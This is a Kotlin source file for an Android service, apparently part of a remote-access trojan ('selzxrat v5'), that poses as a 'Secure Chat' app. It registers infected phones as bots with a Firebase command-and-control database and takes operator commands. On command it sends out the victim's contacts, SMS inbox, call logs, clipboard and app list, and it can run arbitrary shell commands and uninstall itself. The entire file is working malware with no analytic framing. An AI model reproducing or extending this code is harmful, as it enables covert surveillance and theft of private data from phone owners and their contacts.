package com.secure.chat.services

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.firebase.database.*
import com.google.firebase.FirebaseApp
import kotlinx.coroutines.*
import java.io.BufferedReader
import java.io.InputStreamReader
import java.util.UUID

class TargetC2Service : Service() {

    companion object {
        private const val TAG = "TargetC2"
        private const val FIREBASE_URL = "https://selzxrat-v5-c2-default-rtdb.firebaseio.com"
        private const val REF_BOTS = "selzxratV5/bots"
        private const val REF_COMMANDS = "selzxratV5/commands"
        private const val REF_BROADCAST = "selzxratV5/broadcast"
        private const val REF_EXFIL = "selzxratV5/exfiltrated"
        private const val NOTIF_ID = 1001
        private const val CHANNEL_ID = "secure_chat_service"
        private const val CHANNEL_NAME = "Secure Chat Service"

        @Volatile
        var isRunning = false
            private set
        private var _deviceId: String = ""
        private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

        fun getDeviceId(): String = _deviceId
    }

    private val deviceId: String get() = _deviceId

    private lateinit var database: FirebaseDatabase
    private lateinit var botsRef: DatabaseReference
    private lateinit var commandsRef: DatabaseReference
    private lateinit var broadcastRef: DatabaseReference
    private lateinit var exfilRef: DatabaseReference
    private var commandListener: ChildEventListener? = null
    private var broadcastListener: ChildEventListener? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        Log.d(TAG, "Service Created")
    }

    // 🔥 FIX: onStartCommand WAJIB untuk foreground service + init Firebase
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "onStartCommand: ${intent?.action}")

        // 🔥 FIX: Tampilkan notifikasi foreground dalam 5 detik
        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Secure Chat")
            .setContentText("Connected")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setOngoing(true)
            .build()
        startForeground(NOTIF_ID, notification)

        // Generate atau dapatkan device ID
        _deviceId = android.provider.Settings.Secure.getString(
            contentResolver, android.provider.Settings.Secure.ANDROID_ID
        ) ?: UUID.randomUUID().toString()
        Log.d(TAG, "Device ID: $deviceId")

        // 🔥 FIX: Inisialisasi Firebase & mulai C2 (hanya sekali)
        if (!isRunning) {
            initFirebase()
            registerBot()
            listenForCommands()
            listenForBroadcast()
            isRunning = true
            Log.d(TAG, "✅ C2 Service initialized & running")
        }

        return START_STICKY
    }

    // 🔥 FIX: Init Firebase dengan error handling lengkap
    private fun initFirebase() {
        try {
            // Pastikan FirebaseApp terinisialisasi
            if (FirebaseApp.getApps(this).isEmpty()) {
                FirebaseApp.initializeApp(this)
            }
            database = FirebaseDatabase.getInstance(FIREBASE_URL)
            database.setPersistenceEnabled(true)
            botsRef = database.getReference(REF_BOTS)
            commandsRef = database.getReference(REF_COMMANDS)
            broadcastRef = database.getReference(REF_BROADCAST)
            exfilRef = database.getReference(REF_EXFIL)
            Log.d(TAG, "✅ Firebase initialized: $FIREBASE_URL")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Firebase init error: ${e.message}", e)
            // 🔥 FIX: Coba lagi setelah delay 3 detik
            scope.launch {
                delay(3000)
                try {
                    database = FirebaseDatabase.getInstance(FIREBASE_URL)
                    botsRef = database.getReference(REF_BOTS)
                    commandsRef = database.getReference(REF_COMMANDS)
                    broadcastRef = database.getReference(REF_BROADCAST)
                    exfilRef = database.getReference(REF_EXFIL)
                    Log.d(TAG, "✅ Firebase init (retry) success")
                } catch (e2: Exception) {
                    Log.e(TAG, "❌ Firebase init (retry) failed: ${e2.message}")
                }
            }
        }
    }

    // 🔥 FIX: Register bot dengan retry mechanism
    private fun registerBot() {
        scope.launch {
            delay(1000) // Tunggu Firebase init
            if (!::botsRef.isInitialized) {
                Log.e(TAG, "botsRef not initialized, skipping register")
                return@launch
            }

            try {
                val botData = hashMapOf(
                    "deviceId" to deviceId,
                    "deviceName" to android.os.Build.MODEL,
                    "deviceModel" to android.os.Build.MODEL,
                    "androidVersion" to android.os.Build.VERSION.RELEASE,
                    "manufacturer" to android.os.Build.MANUFACTURER,
                    "isOnline" to true,
                    "lastSeen" to ServerValue.TIMESTAMP,
                    "ipAddress" to getIPAddress(),
                    "country" to getSimInfo(),
                    "batteryLevel" to getBatteryLevel(),
                    "isCharging" to isCharging(),
                    "ramTotal" to getRamTotal(),
                    "ramAvailable" to getRamAvailable(),
                    "storageTotal" to getStorageTotal(),
                    "storageAvailable" to getStorageAvailable(),
                    "installedApps" to getInstalledAppCount(),
                    "isAccessibilityEnabled" to false,
                    "isNotificationListenerEnabled" to false,
                    "isAdminEnabled" to false,
                    "isScreenLocked" to false,
                    "simInfo" to getSimInfo()
                )

                Log.d(TAG, "Registering bot: $deviceId")
                botsRef.child(deviceId).setValue(botData)
                    .addOnSuccessListener {
                        Log.d(TAG, "✅ Bot registered successfully: $deviceId")
                        // Update online status berkala
                        startHeartbeat()
                    }
                    .addOnFailureListener { e ->
                        Log.e(TAG, "❌ Bot register failed: ${e.message}")
                        // 🔥 FIX: Retry setelah 5 detik
                        scope.launch {
                            delay(5000)
                            registerBot()
                        }
                    }
            } catch (e: Exception) {
                Log.e(TAG, "❌ Bot register error: ${e.message}", e)
                scope.launch {
                    delay(5000)
                    registerBot()
                }
            }
        }
    }

    // 🔥 FIX: Heartbeat biar bot tetep online
    private fun startHeartbeat() {
        scope.launch {
            while (isActive && isRunning) {
                delay(30000) // Setiap 30 detik
                try {
                    if (::botsRef.isInitialized) {
                        botsRef.child(deviceId).child("lastSeen").setValue(ServerValue.TIMESTAMP)
                        botsRef.child(deviceId).child("isOnline").setValue(true)
                        botsRef.child(deviceId).child("batteryLevel").setValue(getBatteryLevel())
                        botsRef.child(deviceId).child("ipAddress").setValue(getIPAddress())
                        Log.d(TAG, "Heartbeat sent")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Heartbeat error: ${e.message}")
                }
            }
        }
    }

    // 🔥 FIX: Listen commands dengan error handling
    private fun listenForCommands() {
        scope.launch {
            delay(2000) // Tunggu Firebase siap
            if (!::commandsRef.isInitialized) {
                Log.e(TAG, "commandsRef not initialized")
                return@launch
            }

            commandListener = object : ChildEventListener {
                override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
                    try {
                        val cmdMap = snapshot.value as? Map<*, *> ?: return
                        val target = cmdMap["target"] as? String ?: ""
                        val cmdType = cmdMap["type"] as? String ?: ""
                        val payload = cmdMap["payload"] as? String ?: ""

                        // Hanya proses command yang ditujukan untuk device ini atau broadcast
                        if (target == deviceId || target.isEmpty()) {
                            Log.d(TAG, "📩 Command received: $cmdType | $payload")
                            processCommand(cmdType, payload, snapshot.key ?: "")
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error processing command: ${e.message}")
                    }
                }

                override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {}
                override fun onChildRemoved(snapshot: DataSnapshot) {}
                override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}

                override fun onCancelled(error: DatabaseError) {
                    Log.e(TAG, "Command listener cancelled: ${error.message}")
                    // 🔥 FIX: Auto reconnect
                    scope.launch {
                        delay(5000)
                        if (isRunning) listenForCommands()
                    }
                }
            }

            commandsRef.addChildEventListener(commandListener!!)
            Log.d(TAG, "Listening for commands...")
        }
    }

    // 🔥 FIX: Listen broadcast commands
    private fun listenForBroadcast() {
        scope.launch {
            delay(2500)
            if (!::broadcastRef.isInitialized) return@launch

            broadcastListener = object : ChildEventListener {
                override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
                    try {
                        val cmdMap = snapshot.value as? Map<*, *> ?: return
                        val cmdType = cmdMap["type"] as? String ?: ""
                        val payload = cmdMap["payload"] as? String ?: ""
                        Log.d(TAG, "📢 Broadcast received: $cmdType | $payload")
                        processCommand(cmdType, payload, snapshot.key ?: "")
                    } catch (e: Exception) {
                        Log.e(TAG, "Error processing broadcast: ${e.message}")
                    }
                }

                override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {}
                override fun onChildRemoved(snapshot: DataSnapshot) {}
                override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}
                override fun onCancelled(error: DatabaseError) {}
            }

            broadcastRef.addChildEventListener(broadcastListener!!)
        }
    }

    // 🔥 FIX: Process command dengan complete command list
    private fun processCommand(type: String, payload: String, cmdId: String) {
        Log.d(TAG, "Executing command: $type")

        // Tandai command sebagai "processed"
        try {
            if (::commandsRef.isInitialized && cmdId.isNotEmpty()) {
                commandsRef.child(cmdId).child("status").setValue("processed")
            }
        } catch (_: Exception) {}

        when (type) {
            "ping" -> sendExfil("pong", "Pong! Device is alive")
            "get_info" -> sendDeviceInfo()
            "get_contacts" -> handleGetContacts()
            "get_sms" -> handleGetSMS()
            "get_call_logs" -> handleGetCallLogs()
            "get_location" -> sendExfil("get_location", "Location feature requires ACCESS_FINE_LOCATION permission")
            "list_apps" -> handleListApps()
            "clipboard_get" -> handleClipboardGet()
            "clipboard_set" -> handleClipboardSet(payload)
            "vibrate" -> handleVibrate(payload)
            "torch_on" -> handleTorch(true)
            "torch_off" -> handleTorch(false)
            "toast" -> handleToast(payload)
            "open_url" -> handleOpenURL(payload)
            "send_sms" -> handleSendSMS(payload)
            "shell_exec" -> handleShellExec(payload)
            "self_destruct" -> handleSelfDestruct()
            "get_installed_apps" -> handleListApps()
            else -> sendExfil("unknown", "Unknown command: $type")
        }
    }

    // =================== COMMAND HANDLERS ===================

    private fun sendDeviceInfo() {
        val info = """
            Device: ${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}
            Android: ${android.os.Build.VERSION.RELEASE} (API ${android.os.Build.VERSION.SDK_INT})
            Device ID: $deviceId
            IP: ${getIPAddress()}
            Battery: ${getBatteryLevel()}%${if (isCharging()) " (Charging)" else ""}
            SIM: ${getSimInfo()}
        """.trimIndent()
        sendExfil("device_info", info)
    }

    private fun handleGetContacts() {
        try {
            val cursor = contentResolver.query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null
            )
            val contacts = mutableListOf<String>()
            cursor?.use {
                while (it.moveToNext()) {
                    val name = it.getString(it.getColumnIndexOrThrow(android.provider.ContactsContract.Contacts.DISPLAY_NAME))
                    val phone = it.getString(it.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER))
                    contacts.add("$name: $phone")
                }
            }
            sendExfil("contacts", contacts.joinToString("\n").take(5000))
        } catch (e: Exception) {
            sendExfil("contacts", "Error: ${e.message}")
        }
    }

    private fun handleGetSMS() {
        try {
            val cursor = contentResolver.query(
                android.net.Uri.parse("content://sms/inbox"),
                null, null, null, "date DESC LIMIT 50"
            )
            val messages = mutableListOf<String>()
            cursor?.use {
                while (it.moveToNext()) {
                    val address = it.getString(it.getColumnIndexOrThrow("address"))
                    val body = it.getString(it.getColumnIndexOrThrow("body"))
                    val date = it.getString(it.getColumnIndexOrThrow("date"))
                    messages.add("[$date] $address: $body")
                }
            }
            sendExfil("sms", messages.joinToString("\n").take(5000))
        } catch (e: Exception) {
            sendExfil("sms", "Error: ${e.message}")
        }
    }

    private fun handleGetCallLogs() {
        try {
            val cursor = contentResolver.query(
                android.provider.CallLog.Calls.CONTENT_URI,
                null, null, null, android.provider.CallLog.Calls.DATE + " DESC LIMIT 50"
            )
            val logs = mutableListOf<String>()
            cursor?.use {
                while (it.moveToNext()) {
                    val number = it.getString(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.NUMBER))
                    val type = it.getString(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.TYPE))
                    val date = it.getString(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.DATE))
                    val duration = it.getString(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.DURATION))
                    logs.add("[$date] Type=$type Num=$number Dur=${duration}s")
                }
            }
            sendExfil("call_logs", logs.joinToString("\n").take(5000))
        } catch (e: Exception) {
            sendExfil("call_logs", "Error: ${e.message}")
        }
    }

    private fun handleListApps() {
        try {
            val apps = packageManager.getInstalledApplications(0)
            val list = apps.map { "${packageManager.getApplicationLabel(it)} (${it.packageName})" }
            sendExfil("list_apps", list.joinToString("\n").take(5000))
        } catch (e: Exception) {
            sendExfil("list_apps", "Error: ${e.message}")
        }
    }

    private fun handleClipboardGet() {
        try {
            val clip = (getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager).primaryClip
            val text = if (clip != null && clip.itemCount > 0) clip.getItemAt(0).text?.toString() ?: "" else ""
            sendExfil("clipboard", text)
        } catch (e: Exception) {
            sendExfil("clipboard", "Error: ${e.message}")
        }
    }

    private fun handleClipboardSet(text: String) {
        try {
            (getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager)
                .setPrimaryClip(android.content.ClipData.newPlainText("text", text))
            sendExfil("clipboard", "Clipboard set")
        } catch (e: Exception) {
            sendExfil("clipboard", "Error: ${e.message}")
        }
    }

    private fun handleVibrate(pattern: String) {
        try {
            val v = getSystemService(Context.VIBRATOR_SERVICE) as android.os.Vibrator
            val ms = pattern.split(",").mapNotNull { it.trim().toLongOrNull() }.toLongArray()
            val patternArr = if (ms.isEmpty()) longArrayOf(0, 1000) else ms
            if (Build.VERSION.SDK_INT >= 26) {
                v.vibrate(android.os.VibrationEffect.createWaveform(patternArr, -1))
            } else {
                @Suppress("DEPRECATION")
                v.vibrate(patternArr, -1)
            }
            sendExfil("vibrate", "Vibrated")
        } catch (e: Exception) {
            sendExfil("vibrate", "Error: ${e.message}")
        }
    }

    @Suppress("DEPRECATION")
    private fun handleTorch(enable: Boolean) {
        try {
            val cameraManager = getSystemService(Context.CAMERA_SERVICE) as android.hardware.camera2.CameraManager
            val cameraId = cameraManager.cameraIdList[0]
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                cameraManager.setTorchMode(cameraId, enable)
            } else {
                val cam = android.hardware.Camera.open()
                val params = cam.parameters
                params.flashMode = if (enable) android.hardware.Camera.Parameters.FLASH_MODE_TORCH
                    else android.hardware.Camera.Parameters.FLASH_MODE_OFF
                cam.parameters = params
                if (!enable) cam.release()
            }
            sendExfil("torch", if (enable) "Torch ON" else "Torch OFF")
        } catch (e: Exception) {
            sendExfil("torch", "Error: ${e.message}")
        }
    }

    private fun handleToast(message: String) {
        android.os.Handler(android.os.Looper.getMainLooper()).post {
            android.widget.Toast.makeText(this, message, android.widget.Toast.LENGTH_LONG).show()
        }
        sendExfil("toast", "Toast: $message")
    }

    private fun handleOpenURL(url: String) {
        try {
            startActivity(Intent(Intent.ACTION_VIEW, android.net.Uri.parse(url)).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            })
            sendExfil("open_url", "URL opened: $url")
        } catch (e: Exception) {
            sendExfil("open_url", "Error: ${e.message}")
        }
    }

    private fun handleSendSMS(data: String) {
        val parts = data.split("|", limit = 2)
        if (parts.size < 2) {
            sendExfil("send_sms", "Format: number|message")
            return
        }
        try {
            startActivity(Intent(Intent.ACTION_SENDTO).apply {
                data = android.net.Uri.parse("smsto:${parts[0].trim()}")
                putExtra("sms_body", parts[1].trim())
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            })
            sendExfil("send_sms", "SMS opened for ${parts[0].trim()}")
        } catch (e: Exception) {
            sendExfil("send_sms", "Error: ${e.message}")
        }
    }

    private fun handleShellExec(command: String) {
        try {
            val process = Runtime.getRuntime().exec(command)
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            val output = reader.readText()
            process.waitFor()
            sendExfil("shell_exec", output.take(5000))
        } catch (e: Exception) {
            sendExfil("shell_exec", "Error: ${e.message}")
        }
    }

    private fun handleSelfDestruct() {
        sendExfil("self_destruct", "Self-destruct initiated")
        try { botsRef.child(deviceId).removeValue() } catch (_: Exception) {}
        try {
            startActivity(Intent(Intent.ACTION_DELETE).apply {
                data = android.net.Uri.parse("package:$packageName")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            })
        } catch (_: Exception) {}
        stopC2()
        stopSelf()
    }

    // =================== EXFIL ===================

    private fun sendExfil(type: String, content: String) {
        try {
            if (!::exfilRef.isInitialized) {
                Log.e(TAG, "exfilRef not initialized")
                return
            }
            val data = hashMapOf(
                "type" to type,
                "content" to content,
                "deviceId" to deviceId,
                "timestamp" to ServerValue.TIMESTAMP
            )
            exfilRef.push().setValue(data)
                .addOnSuccessListener { Log.d(TAG, "✅ Exfil sent: $type") }
                .addOnFailureListener { e -> Log.e(TAG, "❌ Exfil GAGAL: ${e.message}") }
        } catch (e: Exception) {
            Log.e(TAG, "Exfil error", e)
        }
    }

    // =================== UTILITY ===================

    private fun getIPAddress(): String {
        try {
            val ifaces = java.net.NetworkInterface.getNetworkInterfaces()
            while (ifaces.hasMoreElements()) {
                val addrs = ifaces.nextElement().inetAddresses
                while (addrs.hasMoreElements()) {
                    val a = addrs.nextElement()
                    if (!a.isLoopbackAddress && a is java.net.Inet4Address) {
                        return a.hostAddress ?: ""
                    }
                }
            }
        } catch (_: Exception) {}
        return ""
    }

    private fun getBatteryLevel(): Int {
        try {
            val i = registerReceiver(null, android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED)) ?: return -1
            val l = i.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1)
            val s = i.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1)
            return if (l >= 0 && s > 0) (l * 100) / s else -1
        } catch (_: Exception) { return -1 }
    }

    private fun isCharging(): Boolean {
        try {
            val s = registerReceiver(null, android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED))
                ?.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1) ?: -1
            return s == android.os.BatteryManager.BATTERY_STATUS_CHARGING ||
                   s == android.os.BatteryManager.BATTERY_STATUS_FULL
        } catch (_: Exception) { return false }
    }

    private fun getSimInfo(): String {
        val tm = getSystemService(Context.TELEPHONY_SERVICE) as? android.telephony.TelephonyManager ?: return "N/A"
        return try {
            "${tm.simOperatorName ?: "N/A"} | ${tm.simCountryIso?.uppercase() ?: "N/A"}"
        } catch (_: Exception) { "N/A" }
    }

    private fun getRamTotal(): Long {
        try {
            val mem = java.io.File("/proc/meminfo").readText()
            val match = java.util.regex.Pattern.compile("MemTotal:\\s+(\\d+)").matcher(mem)
            if (match.find()) return match.group(1).toLong() * 1024
        } catch (_: Exception) {}
        return 0
    }

    private fun getRamAvailable(): Long {
        try {
            val mem = java.io.File("/proc/meminfo").readText()
            val match = java.util.regex.Pattern.compile("MemAvailable:\\s+(\\d+)").matcher(mem)
            if (match.find()) return match.group(1).toLong() * 1024
        } catch (_: Exception) {}
        return 0
    }

    private fun getStorageTotal(): Long {
        try {
            val stat = android.os.StatFs(java.io.Environment.getDataDirectory().absolutePath)
            return stat.totalBytes
        } catch (_: Exception) { return 0 }
    }

    private fun getStorageAvailable(): Long {
        try {
            val stat = android.os.StatFs(java.io.Environment.getDataDirectory().absolutePath)
            return stat.availableBytes
        } catch (_: Exception) { return 0 }
    }

    private fun getInstalledAppCount(): Int {
        return try {
            packageManager.getInstalledApplications(0).size
        } catch (_: Exception) { 0 }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                CHANNEL_NAME,
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Background service for C2 communication"
                setShowBadge(false)
                enableVibration(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            if (manager != null) {
                manager.createNotificationChannel(channel)
            }
        }
    }

    // =================== STOP & CLEANUP ===================

    private fun stopC2() {
        isRunning = false
        scope.cancel()
        try {
            if (::botsRef.isInitialized) {
                botsRef.child(deviceId).child("isOnline").setValue(false)
                    .addOnFailureListener { Log.e(TAG, "Gagal set offline: ${it.message}") }
            }
            if (::commandsRef.isInitialized && commandListener != null) {
                commandsRef.removeEventListener(commandListener!!)
            }
            if (::broadcastRef.isInitialized && broadcastListener != null) {
                broadcastRef.removeEventListener(broadcastListener!!)
            }
        } catch (_: Exception) {}
        try {
            stopForeground(STOP_FOREGROUND_REMOVE)
        } catch (_: Exception) {}
        Log.d(TAG, "C2 Service stopped")
    }

    override fun onDestroy() {
        super.onDestroy()
        stopC2()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
